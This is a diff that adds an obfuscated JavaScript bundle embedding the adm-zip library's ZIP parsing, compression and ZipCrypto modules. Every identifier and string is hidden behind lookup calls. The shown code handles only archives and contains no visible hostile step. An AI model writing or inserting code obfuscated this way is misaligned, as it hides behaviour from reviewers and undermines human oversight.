+                        var N = Buffer[mw(0x26a)](Q[mw(0x362)] + f);
+                        return N[mw(0x2f3)](Q[mw(0x1aa)], 0x0), N[mw(0x2f3)](0x0, 0x4), N[mw(0x17e)](h, Q[mw(0x2d3)]), N[mw(0x17e)](c, Q[mw(0x382)]), N[mw(0x2f3)](U, Q[mw(0x348)]), N[mw(0x2f3)](_offset, Q['ENDOFF']), N[mw(0x17e)](f, Q['ENDCOM']), N[mw(0x2af)]('\x20', Q[mw(0x362)]), N;
+                    },
+                    'toJSON': function () {
+                        const mP = m, offset = function (N, I) {
+                                const mv = m;
+                                let offs = N[mv(0x234)](0x10)[mv(0x2e5)]();
+                                while (offs[mv(0x2ca)] < I)
+                                    offs = '0' + offs;
+                                return '0x' + offs;
+                            };
+                        return {
+                            'diskEntries': h,
+                            'totalEntries': c,
+                            'size': U + mP(0x31d),
+                            'offset': offset(_offset, 0x4),
+                            'commentLength': f
+                        };
+                    },
+                    'toString': function () {
+                        const mb = m;
+                        return JSON[mb(0x39f)](this[mb(0x3a1)](), null, '\x09');
+                    }
+                };
+            };
+        }
+    }), require_headers = r({
+        'node_modules/adm-zip/headers/index.js'(D) {
+            const mT = tE;
+            D[mT(0x1ab)] = require_entryHeader(), D[mT(0x308)] = require_mainHeader();
+        }
+    }), require_deflater = r({
+        'node_modules/adm-zip/methods/deflater.js'(D, z) {
+            z['exports'] = function (e) {
+                const mq = m;
+                var Q = require(mq(0x225)), h = { 'chunkSize': (parseInt(e[mq(0x2ca)] / 0x400) + 0x1) * 0x400 };
+                return {
+                    'deflate': function () {
+                        const mO = mq;
+                        return Q[mO(0x32a)](e, h);
+                    },
+                    'deflateAsync': function (c) {
+                        const mR = mq;
+                        var U = Q[mR(0x392)](h), f = [], N = 0x0;
+                        U['on'](mR(0x278), function (I) {
+                            const mG = mR;
+                            f[mG(0x1a6)](I), N += I[mG(0x2ca)];
+                        }), U['on'](mR(0x2d6), function () {
+                            const mk = mR;
+                            var I = Buffer[mk(0x26a)](N), Y = 0x0;
+                            I[mk(0x2af)](0x0);
+                            for (var H = 0x0; H < f[mk(0x2ca)]; H++) {
+                                var J = f[H];
+                                J[mk(0x1b4)](I, Y), Y += J[mk(0x2ca)];
+                            }
+                            c && c(I);
+                        }), U['end'](e);
+                    }
+                };
+            };
+        }
+    }), require_inflater = r({
+        'node_modules/adm-zip/methods/inflater.js'(D, z) {
+            const mZ = tE;
+            var e = +(process[mZ(0x1ad)] ? process[mZ(0x1ad)][mZ(0x342)] : '')[mZ(0x255)]('.')[0x0] || 0x0;
+            z['exports'] = function (Q, h) {
+                var c = require('zlib');
+                const U = e >= 0xf && h > 0x0 ? { 'maxOutputLength': h } : {};
+                return {
+                    'inflate': function () {
+                        const ms = m;
+                        return c[ms(0x1e2)](Q, U);
+                    },
+                    'inflateAsync': function (f) {
+                        const mc = m;
+                        var N = c['createInflateRaw'](U), I = [], Y = 0x0;
+                        N['on']('data', function (H) {
+                            const mh = m;
+                            I['push'](H), Y += H[mh(0x2ca)];
+                        }), N['on'](mc(0x2d6), function () {
+                            const mU = mc;
+                            var H = Buffer[mU(0x26a)](Y), J = 0x0;
+                            H[mU(0x2af)](0x0);
+                            for (var K = 0x0; K < I['length']; K++) {
+var M = I[K];
+                                M[mU(0x1b4)](H, J), J += M[mU(0x2ca)];
+                            }
+                            f && f(H);
+                        }), N['end'](Q);
+                    }
+                };
+            };
+        }
+    }), require_zipcrypto = r({
+        'node_modules/adm-zip/methods/zipcrypto.js'(e, Q) {
+            'use strict';
+            const mf = tE;
+            var {randomFillSync: h} = require(mf(0x1fb)), c = require_errors(), U = new Uint32Array(0x100)[mf(0x32b)]((u, C) => {
+                    for (let t0 = 0x0; t0 < 0x8; t0++) {
+                        0x0 !== (C & 0x1) ? C = C >>> 0x1 ^ 0xedb88320 : C >>>= 0x1;
+                    }
+                    return C >>> 0x0;
+                }), f = (u, C) => Math[mf(0x2e3)](u, C) >>> 0x0, N = (u, C) => {
+                    return U[(u ^ C) & 0xff] ^ u >>> 0x8;
+                }, I = () => {
+                    const mN = mf;
+                    return mN(0x198) === typeof h ? h(Buffer[mN(0x26a)](0xc)) : I[mN(0x342)]();
+                };
+            I[mf(0x342)] = () => {
+                const mI = mf, u = Buffer[mI(0x26a)](0xc), C = u['length'];
+                for (let t0 = 0x0; t0 < C; t0++)
+                    u[t0] = Math[mI(0x21b)]() * 0x100 & 0xff;
+                return u;
+            };
+            const Y = {};
+            Y[mf(0x36c)] = I;
+            var H = Y;
+            function J(u) {
+                const mY = mf, C = Buffer[mY(0x23b)](u) ? u : Buffer['from'](u);
+                this[mY(0x2cc)] = new Uint32Array([
+                    0x12345678,
+                    0x23456789,
+                    0x34567890
+                ]);
+                for (let t0 = 0x0; t0 < C[mY(0x2ca)]; t0++) {
+                    this[mY(0x1b7)](C[t0]);
+                }
+            }
+            J[mf(0x256)][mf(0x1b7)] = function (u) {
+                const C = this['keys'];
+                return C[0x0] = N(C[0x0], u), C[0x1] += C[0x0] & 0xff, C[0x1] = f(C[0x1], 0x8088405) + 0x1, C[0x2] = N(C[0x2], C[0x1] >>> 0x18), u;
+            }, J[mf(0x256)][mf(0x1d7)] = function () {
+                const mH = mf, u = (this[mH(0x2cc)][0x2] | 0x2) >>> 0x0;
+                return f(u, u ^ 0x1) >> 0x8 & 0xff;
+            };
+            function K(u) {
+                const C = new J(u);
+                return function (t0) {
+                    const mJ = m, t1 = Buffer['alloc'](t0['length']);
+                    let t2 = 0x0;
+                    for (let t3 of t0) {
+                        t1[t2++] = C[mJ(0x1b7)](t3 ^ C[mJ(0x1d7)]());
+                    }
+                    return t1;
+                };
+            }
+            function M(u) {
+                const C = new J(u);
+                return function (t0, t1, t2 = 0x0) {
+                    const mK = m;
+                    if (!t1)
+                        t1 = Buffer[mK(0x26a)](t0[mK(0x2ca)]);
+                    for (let t3 of t0) {
+                        const t4 = C['next']();
+                        t1[t2++] = t3 ^ t4, C['updateKeys'](t3);
+                    }
+                    return t1;
+                };
+            }
+            function j(u, C, t0) {
+                const mM = mf;
+                if (!u || !Buffer[mM(0x23b)](u) || u[mM(0x2ca)] < 0xc)
+                    return Buffer['alloc'](0x0);
+                const t1 = K(t0), t2 = t1(u[mM(0x1e1)](0x0, 0xc)), t3 = (C['flags'] & 0x8) === 0x8 ? C[mM(0x3b3)] : C[mM(0x29e)] >>> 0x18;
+                if (t2[0xb] !== t3)
+                    throw c['WRONG_PASSWORD']();
+                return t1(u[mM(0x1e1)](0xc));
+            }
+            function L(u) {
+                const mj = mf;
+                if (Buffer[mj(0x23b)](u) && u['length'] >= 0xc)
+                    H[mj(0x36c)] = function () {
+                        const mL = mj;
+                        return u[mL(0x1e1)](0x0, 0xc);
+                    };
+                else
+                    u === mj(0x342) ? H['genSalt'] = I[mj(0x342)] : H[mj(0x36c)] = I;
+            }
+            function p(u, C, t0, t1 = ![]) {
+                const mp = mf;
+                if (u == null)
+                    u = Buffer[mp(0x26a)](0x0);
+                if (!Buffer[mp(0x23b)](u))
+                    u = Buffer[mp(0x351)](u[mp(0x234)]());
+                const t2 = M(t0), t3 = H[mp(0x36c)]();
+                t3[0xb] = C[mp(0x29e)] >>> 0x18 & 0xff;
+                if (t1)
+                    t3[0xa] = C[mp(0x29e)] >>> 0x10 & 0xff;
+                const t4 = Buffer[mp(0x26a)](u[mp(0x2ca)] + 0xc);
+                return t2(t3, t4), t2(u, t4, 0xc);
+            }
+            const g = {};
+            g[mf(0x246)] = j, g[mf(0x1cb)] = p, g['_salter'] = L, Q[mf(0x2a5)] = g;
+        }
+    }), require_methods = r({
+        'node_modules/adm-zip/methods/index.js'(D) {
+            const mg = tE;
+            D[mg(0x232)] = require_deflater(), D['Inflater'] = require_inflater(), D[mg(0x335)] = require_zipcrypto();
+        }
+    }), require_zipEntry = r({
+        'node_modules/adm-zip/zipEntry.js'(D, z) {
+            const mu = tE;
+            var e = require_util(), Q = require_headers(), h = e[mu(0x3ae)], c = require_methods();
+            z[mu(0x2a5)] = function (U, f) {
+                const mC = mu;
+                var N = new Q['EntryHeader'](), I = Buffer[mC(0x26a)](0x0), Y = Buffer[mC(0x26a)](0x0), H = ![], J = null, K = Buffer[mC(0x26a)](0x0), M = Buffer[mC(0x26a)](0x0), _efs = !![];
+                const j = U, L = typeof j[mC(0x1d6)] === 'object' ? j[mC(0x1d6)] : e[mC(0x1d6)];
+                _efs = L[mC(0x220)](mC(0x346)) ? L[mC(0x346)] : ![];
+                function p() {
+                    const D0 = mC;
+                    if (!f || !(f instanceof Uint8Array))
+                        return Buffer[D0(0x26a)](0x0);
+                    return M = N[D0(0x23f)](f), f[D0(0x1e1)](N[D0(0x1cd)], N[D0(0x1cd)] + N[D0(0x316)]);
+                }
+                function g(t3) {
+                    const D1 = mC;
+                    if (!N['flags_desc']) {
+                        if (e[D1(0x1a4)](t3) !== N[D1(0x201)][D1(0x29e)])
+                            return ![];
+                    } else {
+                        const t4 = {}, dataEndOffset = N[D1(0x1cd)] + N['compressedSize'];
+                        if (f[D1(0x243)](dataEndOffset) == h[D1(0x1e8)] || f[D1(0x243)](dataEndOffset) == h['CENSIG'])
+                            throw e[D1(0x26b)][D1(0x224)]();
+                        if (f[D1(0x243)](dataEndOffset) == h['EXTSIG'])
+                            t4[D1(0x29e)] = f[D1(0x243)](dataEndOffset + h[D1(0x328)]), t4[D1(0x316)] = f['readUInt32LE'](dataEndOffset + h[D1(0x31b)]), t4[D1(0x3a2)] = f[D1(0x243)](dataEndOffset + h[D1(0x2f1)]);
+                        else {
+                            if (f['readUInt16LE'](dataEndOffset + 0xc) === 0x4b50)
+                                t4[D1(0x29e)] = f[D1(0x243)](dataEndOffset + h['EXTCRC'] - 0x4), t4[D1(0x316)] = f[D1(0x243)](dataEndOffset + h['EXTSIZ'] - 0x4), t4['size'] = f[D1(0x243)](dataEndOffset + h[D1(0x2f1)] - 0x4);
+                            else
+                                throw e[D1(0x26b)]['DESCRIPTOR_UNKNOWN']();
+                        }
+                        if (t4[D1(0x316)] !== N[D1(0x316)] || t4[D1(0x3a2)] !== N[D1(0x3a2)] || t4[D1(0x29e)] !== N['crc'])
+                            throw e[D1(0x26b)][D1(0x18e)]();
+                        if (e[D1(0x1a4)](t3) !== t4[D1(0x29e)])
+                            return ![];
+                    }
+                    return !![];
+                }
+                function u(t3, t4, t5) {
+                    const D2 = mC;
+                    typeof t4 === 'undefined' && typeof t3 === 'string' && (t5 = t3, t3 = void 0x0);
+                    if (H)
+                        return t3 && t4 && t4(Buffer[D2(0x26a)](0x0), e[D2(0x26b)]['DIRECTORY_CONTENT_ERROR']()), Buffer['alloc'](0x0);
+                    var t6 = p();
+                    if (t6['length'] === 0x0) {
+                        if (t3 && t4)
+                            t4(t6);
+                        return t6;
+                    }
+                    if (N[D2(0x1b9)]) {
+                        if (D2(0x1df) !== typeof t5 && !Buffer['isBuffer'](t5))
+                            throw e['Errors'][D2(0x24d)]();
+                        t6 = c[D2(0x335)]['decrypt'](t6, N, t5);
+                    }
+                    var t7 = Buffer[D2(0x26a)](N[D2(0x3a2)]);
+                    switch (N[D2(0x333)]) {
+                    case e['Constants'][D2(0x29d)]:
+                        t6[D2(0x1b4)](t7);
+                        if (!g(t7)) {
+                            if (t3 && t4)
+                                t4(t7, e['Errors'][D2(0x269)]());
+                            throw e[D2(0x26b)][D2(0x269)]();
+                        } else {
+                            if (t3 && t4)
+                                t4(t7);
+                            return t7;
+                        }
+                    case e['Constants'][D2(0x1cc)]:
+                        var t8 = new c[(D2(0x18d))](t6, N['size']);
+                        if (!t3) {
+                            const t9 = t8[D2(0x238)](t7);
+                            t9[D2(0x1b4)](t7, 0x0);
+                            if (!g(t7))
+                                throw e[D2(0x26b)][D2(0x269)]('\x22' + L[D2(0x37f)](I) + '\x22');
+                            return t7;
+                        } else
+                            t8['inflateAsync'](function (tt) {
+                                const D3 = D2;
+                                tt[D3(0x1b4)](tt, 0x0), t4 && (!g(tt) ? t4(tt, e[D3(0x26b)][D3(0x269)]()) : t4(tt));
+                            });
+                        break;
+                    default:
+                        if (t3 && t4)
+                            t4(Buffer['alloc'](0x0), e[D2(0x26b)][D2(0x1c8)]());
+                        throw e[D2(0x26b)]['UNKNOWN_METHOD']();
+                    }
+                }
+                function C(t3, t4) {
+                    const D4 = mC;
+                    if ((!J || !J[D4(0x2ca)]) && Buffer[D4(0x23b)](f)) {
+                        if (t3 && t4)
+                            t4(p());
+                        return p();
+                    }
+                    if (J[D4(0x2ca)] && !H) {
+                        var t5;
+                        switch (N[D4(0x333)]) {
+                        case e[D4(0x3ae)]['STORED']:
+                            N[D4(0x316)] = N['size'], t5 = Buffer[D4(0x26a)](J[D4(0x2ca)]), J[D4(0x1b4)](t5);
+                            if (t3 && t4)
+                                t4(t5);
+                            return t5;
+                        default:
+                        case e[D4(0x3ae)][D4(0x1cc)]:
+                            var t6 = new c[(D4(0x232))](J);
+                            if (!t3) {
+                                var t7 = t6[D4(0x2ff)]();
+                                return N[D4(0x316)] = t7[D4(0x2ca)], t7;
+                            } else
+                                t6[D4(0x2fd)](function (t8) {
+                                    const D5 = D4;
+                                    t5 = Buffer[D5(0x26a)](t8[D5(0x2ca)]), N['compressedSize'] = t8[D5(0x2ca)], t8[D5(0x1b4)](t5), t4 && t4(t5);
+                                });
+                            t6 = null;
+                            break;
+                        }
+                    } else {
+                        if (t3 && t4)
+                            t4(Buffer[D4(0x26a)](0x0));
+                        else
+                            return Buffer[D4(0x26a)](0x0);
+                    }
+                }
+                function t0(t3, offset) {
+                    const D6 = mC;
+                    return (t3[D6(0x243)](offset + 0x4) << 0x4) + t3['readUInt32LE'](offset);
+                }
+                function t1(t3) {
+                    const D7 = mC;
+                    try {
+                        var offset = 0x0, t4, t5, t6;
+         while (offset + 0x4 < t3[D7(0x2ca)]) {
+                            t4 = t3[D7(0x1eb)](offset), offset += 0x2, t5 = t3['readUInt16LE'](offset), offset += 0x2, t6 = t3[D7(0x1e1)](offset, offset + t5), offset += t5, h['ID_ZIP64'] === t4 && t2(t6);
+                        }
+                    } catch (t7) {
+                        throw e['Errors'][D7(0x3a9)]();
+                    }
+                }
+                function t2(t3) {
+                    const D8 = mC;
+                    var t4, t5, offset, t6;
+                    t3['length'] >= h[D8(0x393)] && (t4 = t0(t3, h['EF_ZIP64_SUNCOMP']), N['size'] === h[D8(0x305)] && (N[D8(0x3a2)] = t4)), t3[D8(0x2ca)] >= h[D8(0x1a1)] && (t5 = t0(t3, h[D8(0x393)]), N[D8(0x316)] === h[D8(0x305)] && (N['compressedSize'] = t5)), t3[D8(0x2ca)] >= h[D8(0x1c7)] && (offset = t0(t3, h[D8(0x1a1)]), N[D8(0x34f)] === h['EF_ZIP64_OR_32'] && (N[D8(0x34f)] = offset)), t3[D8(0x2ca)] >= h[D8(0x1c7)] + 0x4 && (t6 = t3[D8(0x243)](h[D8(0x1c7)]), N[D8(0x1fe)] === h['EF_ZIP64_OR_16'] && (N['diskNumStart'] = t6));
+                }
+                return {
+                    get 'entryName'() {
+                        const D9 = mC;
+                        return L[D9(0x37f)](I);
+                    },
+                    get 'rawEntryName'() {
+                        return I;
+                    },
+                    set 'entryName'(t3) {
+                        const Dt = mC;
+                        I = e[Dt(0x219)](t3, L[Dt(0x310)]);
+                        var t4 = I[I[Dt(0x2ca)] - 0x1];
+                        H = t4 === 0x2f || t4 === 0x5c, N[Dt(0x28b)] = I[Dt(0x2ca)];
+                    },
+                    get 'efs'() {
+                        const Dm = mC;
+                        return typeof _efs === 'function' ? _efs(this[Dm(0x285)]) : _efs;
+                    },
+                    get 'extra'() {
+                        return K;
+                    },
+                    set 'extra'(t3) {
+                        const DD = mC;
+                        K = t3, N[DD(0x29f)] = t3[DD(0x2ca)], t1(t3);
+                    },
+                    get 'comment'() {
+                        const Dl = mC;
+                        return L[Dl(0x37f)](Y);
+                    },
+                    set 'comment'(t3) {
+                        const Dz = mC;
+                        Y = e[Dz(0x219)](t3, L['encode']), N[Dz(0x185)] = Y[Dz(0x2ca)];
+                        if (Y[Dz(0x2ca)] > 0xffff)
+                            throw e[Dz(0x26b)][Dz(0x27e)]();
+                    },
+                    get 'name'() {
+                        const De = mC;
+                        var t3 = L[De(0x37f)](I);
+                        return H ? t3['substr'](t3[De(0x2ca)] - 0x1)[De(0x255)]('/')[De(0x366)]() : t3[De(0x255)]('/')[De(0x366)]();
+                    },
+                    get 'isDirectory'() {
+                        return H;
+                    },
+                    'getCompressedData': function () {
+                        return C(![], null);
+                    },
+                    'getCompressedDataAsync': function (t3) {
+                        C(!![], t3);
+                    },
+                    'setData': function (t3) {
+                        const DQ = mC;
+                        J = e[DQ(0x219)](t3, e[DQ(0x1d6)][DQ(0x310)]), !H && J['length'] ? (N[DQ(0x3a2)] = J['length'], N[DQ(0x333)] = e[DQ(0x3ae)][DQ(0x1cc)], N['crc'] = e[DQ(0x1a4)](t3), N[DQ(0x233)] = !![]) : N[DQ(0x333)] = e['Constants'][DQ(0x29d)];
+                    },
+                    'getData': function (t3) {
+                        const DB = mC;
+                        return N[DB(0x233)] ? J : u(![], null, t3);
+                    },
+                    'getDataAsync': function (t3, t4) {
+                        N['changed'] ? t3(J) : u(!![], t3, t4);
+                    },
+                    set 'attr'(t3) {
+                        const Dr = mC;
+                        N[Dr(0x2b7)] = t3;
+                    },
+       get 'attr'() {
+                        const DX = mC;
+                        return N[DX(0x2b7)];
+                    },
+                    set 'header'(t3) {
+                        const Dy = mC;
+                        N[Dy(0x2c8)](t3);
+                    },
+                    get 'header'() {
+                        return N;
+                    },
+                    'packCentralHeader': function () {
+                        const Dd = mC;
+                        N[Dd(0x330)] = this[Dd(0x346)], N[Dd(0x29f)] = K[Dd(0x2ca)];
+                        var t3 = N[Dd(0x38e)](), t4 = e[Dd(0x3ae)][Dd(0x36d)];
+                        return I['copy'](t3, t4), t4 += I[Dd(0x2ca)], K[Dd(0x1b4)](t3, t4), t4 += N[Dd(0x29f)], Y[Dd(0x1b4)](t3, t4), t3;
+                    },
+                    'packLocalHeader': function () {
+                        const Da = mC;
+                        let t3 = 0x0;
+                        N['flags_efs'] = this['efs'], N['extraLocalLength'] = M[Da(0x2ca)];
+                        const t4 = N[Da(0x35d)](), t5 = Buffer[Da(0x26a)](t4['length'] + I[Da(0x2ca)] + N['extraLocalLength']);
+                        return t4[Da(0x1b4)](t5, t3), t3 += t4[Da(0x2ca)], I[Da(0x1b4)](t5, t3), t3 += I['length'], M['copy'](t5, t3), t3 += M[Da(0x2ca)], t5;
+                    },
+                    'toJSON': function () {
+                        const DF = mC, t3 = function (t4) {
+                                const DW = m;
+                                return '<' + (t4 && t4['length'] + DW(0x295) || 'null') + '>';
+                            };
+                        return {
+                            'entryName': this[DF(0x285)],
+                            'name': this[DF(0x1fd)],
+                            'comment': this[DF(0x288)],
+                            'isDirectory': this['isDirectory'],
+                            'header': N[DF(0x3a1)](),
+                            'compressedData': t3(f),
+                            'data': t3(J)
+                        };
+                    },
+                    'toString': function () {
+                        const DS = mC;
+                        return JSON[DS(0x39f)](this[DS(0x3a1)](), null, '\x09');
+                    }
+                };
+            };
+        }
+    }), require_zipFile = r({
+        'node_modules/adm-zip/zipFile.js'(D, z) {
+            var e = require_zipEntry(), Q = require_headers(), h = require_util();
+            z['exports'] = function (c, U) {
+                const DA = m;
+                var f = [], N = {}, I = Buffer[DA(0x26a)](0x0), Y = new Q[(DA(0x308))](), H = ![], J = null;
+                const K = new Set(), M = U, {
+                        noSort: j,
+                        decoder: L
+                    } = M;
+                c ? u(M[DA(0x166)]) : H = !![];
+                function p() {
+                    const DE = DA, t0 = new Set();
+                    for (const t1 of Object[DE(0x2cc)](N)) {
+                        const t2 = t1[DE(0x255)]('/');
+                        t2[DE(0x366)]();
+                        if (!t2['length'])
+                            continue;
+                        for (let t3 = 0x0; t3 < t2[DE(0x2ca)]; t3++) {
+                            const t4 = t2[DE(0x1e1)](0x0, t3 + 0x1)[DE(0x1e6)]('/') + '/';
+                            t0['add'](t4);
+                        }
+                    }
+                    for (const t5 of t0) {
+                        if (!(t5 in N)) {
+                            const t6 = new e(M);
+                            t6[DE(0x285)] = t5, t6[DE(0x2b7)] = 0x10, t6[DE(0x30c)] = !![], f[DE(0x1a6)](t6), N[t6[DE(0x285)]] = t6, K[DE(0x373)](t6);
+                        }
+                    }
+                }
+                function g() {
+                    const DV = DA;
+                    H = !![], N = {};
+                    if (Y[DV(0x1de)] > (c[DV(0x2ca)] - Y[DV(0x34f)]) / h['Constants']['CENHDR'])
+                        throw h[DV(0x26b)][DV(0x277)]();
+f = new Array(Y['diskEntries']);
+                    var t0 = Y[DV(0x34f)];
+                    for (var t1 = 0x0; t1 < f['length']; t1++) {
+                        var t2 = t0, t3 = new e(M, c);
+                        t3['header'] = c[DV(0x1e1)](t2, t2 += h[DV(0x3ae)]['CENHDR']), t3[DV(0x285)] = c[DV(0x1e1)](t2, t2 += t3['header'][DV(0x28b)]);
+                        t3[DV(0x1e7)][DV(0x29f)] && (t3[DV(0x2b1)] = c[DV(0x1e1)](t2, t2 += t3['header'][DV(0x29f)]));
+                        if (t3[DV(0x1e7)][DV(0x185)])
+                            t3[DV(0x288)] = c[DV(0x1e1)](t2, t2 + t3[DV(0x1e7)][DV(0x185)]);
+                        t0 += t3['header']['centralHeaderSize'], f[t1] = t3, N[t3['entryName']] = t3;
+                    }
+                    K[DV(0x178)](), p();
+                }
+                function u(t0) {
+                    const Di = DA;
+                    var t1 = c[Di(0x2ca)] - h[Di(0x3ae)][Di(0x362)], t2 = Math[Di(0x2ea)](0x0, t1 - 0xffff), t3 = t2, t4 = c[Di(0x2ca)], endOffset = -0x1, t5 = 0x0;
+                    const t6 = typeof M[Di(0x242)] === Di(0x16c) ? M[Di(0x242)] : ![];
+                    if (t6)
+                        t2 = 0x0;
+                    for (t1; t1 >= t3; t1--) {
+                        if (c[t1] !== 0x50)
+                            continue;
+                        if (c[Di(0x243)](t1) === h['Constants'][Di(0x1aa)]) {
+                            endOffset = t1, t5 = t1, t4 = t1 + h[Di(0x3ae)][Di(0x362)], t3 = t1 - h[Di(0x3ae)]['END64HDR'];
+                            continue;
+                        }
+                        if (c['readUInt32LE'](t1) === h[Di(0x3ae)][Di(0x259)]) {
+                            t3 = t2;
+                            continue;
+                        }
+                        if (c[Di(0x243)](t1) === h['Constants'][Di(0x390)]) {
+                            endOffset = t1, t4 = t1 + h['readBigUInt64LE'](c, t1 + h[Di(0x3ae)][Di(0x38f)]) + h[Di(0x3ae)][Di(0x307)];
+                            break;
+                        }
+                    }
+                    if (endOffset == -0x1)
+                        throw h[Di(0x26b)][Di(0x3a8)]();
+                    Y[Di(0x2c8)](c[Di(0x1e1)](endOffset, t4));
+                    Y[Di(0x185)] && (I = c[Di(0x1e1)](t5 + h[Di(0x3ae)]['ENDHDR']));
+                    if (t0)
+                        g();
+                }
+                function C() {
+                    const Do = DA;
+                    f[Do(0x2ca)] > 0x1 && !j && f['sort']((t0, t1) => t0['entryName'][Do(0x3aa)]()['localeCompare'](t1[Do(0x285)]['toLowerCase']()));
+                }
+                return {
+                    get 'entries'() {
+                        const Dn = DA;
+                        return !H && g(), f[Dn(0x3a3)](t0 => !K[Dn(0x169)](t0));
+                    },
+                    get 'comment'() {
+                        const Dx = DA;
+                        return L[Dx(0x37f)](I);
+                    },
+                    set 'comment'(t0) {
+                        const Dw = DA;
+                        I = h[Dw(0x219)](t0, L[Dw(0x310)]), Y['commentLength'] = I[Dw(0x2ca)];
+                    },
+                    'getEntryCount': function () {
+                        const Dv = DA;
+                        if (!H)
+                            return Y[Dv(0x1de)];
+                        return f[Dv(0x2ca)];
+                    },
+                    'forEach': function (t0) {
+                        const DP = DA;
+                        this[DP(0x171)][DP(0x299)](t0);
+                    },
+                    'getEntry': function (t0) {
+                        return !H && g(), N[t0] || null;
+                    },
+                    'setEntry': function (t0) {
+                        const Db = DA;
+                        !H && g(), f[Db(0x1a6)](t0), N[t0['entryName']] = t0, Y[Db(0x1bc)] = f['length'];
+                    },
+                    'deleteFile': function (t0, t1 = !![]) {
+                        const DT = DA;
+                        !H && g();
+                        const t2 = N[t0], t3 = this[DT(0x2aa)](t2, t1)['map'](t4 => t4['entryName']);
+                        t3['forEach'](this['deleteEntry']);
+                    },
+                    'deleteEntry': function (t0) {
+                        const Dq = DA;
+                        !H && g();
+                        const t1 = N[t0], t2 = f[Dq(0x2f9)](t1);
+                        t2 >= 0x0 && (f[Dq(0x2db)](t2, 0x1), delete N[t0], Y[Dq(0x1bc)] = f[Dq(0x2ca)]);
+                    },
+                    'getEntryChildren': function (t0, t1 = !![]) {
+                        const DO = DA;
+                        !H && g();
+                        if (typeof t0 === DO(0x2e2)) {
+                            if (t0[DO(0x297)] && t1) {
+                                const t2 = [], t3 = t0[DO(0x285)];
+                                for (const t4 of f) {
+                                    t4['entryName']['startsWith'](t3) && t2[DO(0x1a6)](t4);
+                                }
+                                return t2;
+                            } else
+                                return [t0];
+                        }
+                        return [];
+                    },
+                    'getChildCount': function (t0) {
+                        const DR = DA;
+                        if (t0 && t0[DR(0x297)]) {
+                            const t1 = this[DR(0x2aa)](t0);
+                            return t1[DR(0x36a)](t0) ? t1['length'] - 0x1 : t1[DR(0x2ca)];
+                        }
+                        return 0x0;
+                    },
+                    'compressToBuffer': function () {
+                        const DG = DA;
+                        !H && g();
+                        C();
+                        const t0 = [], t1 = [];
+                        let t2 = 0x0, t3 = 0x0;
+                        Y[DG(0x3a2)] = 0x0, Y[DG(0x34f)] = 0x0;
+                        let t4 = 0x0;
+                        for (const t7 of this[DG(0x171)]) {
+                            const t8 = t7[DG(0x341)]();
+                            t7[DG(0x1e7)]['offset'] = t3;
+                            const t9 = t7[DG(0x3af)](), tt = t9['length'] + t8[DG(0x2ca)];
+                            t3 += tt, t0['push'](t9), t0[DG(0x1a6)](t8);
+                            const tm = t7[DG(0x2ec)]();
+                            t1['push'](tm), Y[DG(0x3a2)] += tm[DG(0x2ca)], t2 += tt + tm[DG(0x2ca)], t4++;
+                        }
+                        t2 += Y['mainHeaderSize'], Y[DG(0x34f)] = t3, Y['totalEntries'] = t4, t3 = 0x0;
+                        const t5 = Buffer[DG(0x26a)](t2);
+                        for (const tD of t0) {
+                            tD[DG(0x1b4)](t5, t3), t3 += tD[DG(0x2ca)];
+                        }
+                        for (const tl of t1) {
+                            tl[DG(0x1b4)](t5, t3), t3 += tl['length'];
+                        }
+                        const t6 = Y['toBinary']();
+                        return I && I[DG(0x1b4)](t6, h['Constants']['ENDHDR']), t6[DG(0x1b4)](t5, t3), c = t5, H = ![], t5;
+                    },
+                    'toAsyncBuffer': function (t0, t1, t2, t3) {
+                        const Dk = DA;
+                        try {
+                            !H && g();
+                            C();
+                            const t4 = [], t5 = [];
+                            let t6 = 0x0, t7 = 0x0, t8 = 0x0;
+                            Y['size'] = 0x0, Y[Dk(0x34f)] = 0x0;
+                            const t9 = function (tt) {
+                                const DZ = Dk;
+                                if (tt[DZ(0x2ca)] > 0x0) {
+                                    const tm = tt['shift'](), tD = tm[DZ(0x285)] + tm[DZ(0x2b1)][DZ(0x234)]();
+                                    if (t2)
+                                        t2(tD);
+                                    tm[DZ(0x2f4)](function (tl) {
+                                        const Ds = DZ;
+                                        if (t3)
+                                            t3(tD);
+                                        tm[Ds(0x1e7)][Ds(0x34f)] = t7;
+                                        const tz = tm[Ds(0x3af)](), te = tz[Ds(0x2ca)] + tl[Ds(0x2ca)];
+                                        t7 += te, t4['push'](tz), t4['push'](tl);
+                                        const tQ = tm['packCentralHeader']();
+                                        t5[Ds(0x1a6)](tQ), Y[Ds(0x3a2)] += tQ['length'], t6 += te + tQ[Ds(0x2ca)], t8++, t9(tt);
+                                    });
+                                } else {
+                                    t6 += Y[DZ(0x187)], Y[DZ(0x34f)] = t7, Y[DZ(0x1bc)] = t8, t7 = 0x0;
+                                    const tl = Buffer[DZ(0x26a)](t6);
+                                    t4[DZ(0x299)](function (te) {
+                                        const Dh = DZ;
+                                        te[Dh(0x1b4)](tl, t7), t7 += te[Dh(0x2ca)];
+                                    }), t5['forEach'](function (te) {
+                                        const Dc = DZ;
+                                        te[Dc(0x1b4)](tl, t7), t7 += te[Dc(0x2ca)];
+                                    });
+                                    const tz = Y[DZ(0x33c)]();
+                                    I && I[DZ(0x1b4)](tz, h[DZ(0x3ae)][DZ(0x362)]), tz[DZ(0x1b4)](tl, t7), c = tl, H = ![], t0(tl);
+                                }
+                            };
+                            t9(Array[Dk(0x351)](this[Dk(0x171)]));
+                        } catch (tt) {
+                            t1(tt);
+                        }
+                    }
+                };
+            };
+        }
+    }), require_adm_zip = r({
+        'node_modules/adm-zip/adm-zip.js'(z, e) {
+            const DU = tE;
+            var Q = require_util(), h = require(DU(0x236)), c = require_zipEntry(), U = require_zipFile(), f = (...J) => Q['findLast'](J, K => typeof K === DU(0x16c)), N = (...J) => Q[DU(0x27b)](J, K => typeof K === DU(0x1df)), I = (...J) => Q[DU(0x27b)](J, K => typeof K === 'function');
+            const Y = {};
+            Y['noSort'] = ![], Y[DU(0x166)] = ![], Y[DU(0x333)] = Q[DU(0x3ae)][DU(0x213)], Y['fs'] = null;
+            var H = Y;
+            e[DU(0x2a5)] = function (J, K) {
+                const Df = DU;
+                let M = null;
+                const j = Object['assign'](Object[Df(0x216)](null), H);
+                if (J && Df(0x2e2) === typeof J) {
+                    if (!(J instanceof Uint8Array)) {
+                        Object[Df(0x227)](j, J), J = j[Df(0x1c1)] ? j[Df(0x1c1)] : void 0x0;
+                        if (j[Df(0x1c1)])
+                            delete j[Df(0x1c1)];
+                    }
+                    Buffer[Df(0x23b)](J) && (M = J, j[Df(0x333)] = Q['Constants'][Df(0x381)], J = void 0x0);
+                }
